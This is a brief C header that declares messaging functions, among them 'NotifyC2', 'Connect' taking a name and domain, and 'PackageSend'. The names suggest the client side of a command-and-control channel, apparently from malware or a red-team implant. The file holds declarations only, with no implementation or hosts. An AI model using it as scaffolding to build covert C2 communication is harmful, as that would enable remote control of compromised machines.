
#pragma once



unsigned char *Send(char* Data);

unsigned char *NotifyC2(unsigned long long MassageSize ,char *MassageType);

int EndNotifyC2();

int PackageSend(const char *Buffer, int Size, const char *RemaingCode);
unsigned char *Connect(char *Name,char* Domain);
extern int MessageQueue;